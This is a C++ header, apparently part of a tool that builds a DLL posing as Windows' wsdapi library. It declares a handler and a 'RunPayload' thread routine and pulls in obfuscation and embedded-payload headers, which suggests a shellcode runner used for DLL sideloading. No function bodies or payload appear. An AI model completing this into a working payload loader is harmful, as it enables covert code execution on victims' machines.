#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include "obfuscation.hpp"

// Will be determined by individual components
#include "embeds.hpp"

#ifndef DLL_HANDLER_LOG_FILE
#error "wsdapi.hpp must have DLL_HANDLER_LOG_FILE set at compile time"
#endif

#ifndef DLL_SH_RUNNER_LOG_FILE
#error "wsdapi.hpp must have DLL_SH_RUNNER_LOG_FILE set at compile time"
#endif

void Handler();

DWORD RunPayload(LPVOID lpThreadParameter);
